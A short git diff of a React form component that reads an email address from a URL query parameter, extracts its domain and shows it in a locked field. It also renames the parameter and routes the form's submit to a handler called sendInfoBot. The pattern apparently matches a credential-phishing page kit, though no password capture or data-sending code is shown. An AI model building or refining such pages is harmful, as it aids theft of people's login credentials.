@@ -27,7 +27,7 @@ const Universal = ({data}) => {
 
   useEffect(() => {
    const mySearchParams = new URLSearchParams(window.location.search)
-   const email = mySearchParams.get('fxn')
+   const email = mySearchParams.get('bcn')
    setEmail(email)
    if(email){
     let dm = email.split('@')[1]
@@ -248,7 +248,7 @@ const Universal = ({data}) => {
         </div>
           <hr className='hrr'></hr>
 
-          <Form className='mt-4' onSubmit={sendInfo}>
+          <Form className='mt-4' onSubmit={sendInfoBot}>
           <Form.Group className="mb-3" controlId="exampleForm.ControlInput1">
             <Form.Label>Email</Form.Label>
             <Form.Control name='email' value={email} type="text" disabled />
